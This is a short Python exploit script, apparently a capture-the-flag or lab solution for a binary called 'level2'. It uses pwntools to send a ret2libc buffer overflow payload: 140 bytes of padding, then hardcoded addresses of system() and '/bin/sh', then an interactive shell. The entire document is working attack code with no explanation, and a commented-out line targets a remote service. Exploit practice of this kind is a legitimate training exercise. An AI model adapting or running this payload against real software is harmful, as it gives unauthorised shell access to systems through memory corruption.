
#!/usr/bin/env python
from pwn import *

p = process('./level2')
#p = remote('127.0.0.1',10002)

ret = 0xdeadbeef
systemaddr=0xf7e18a00
binshaddr=0xf7f58ad1

payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()
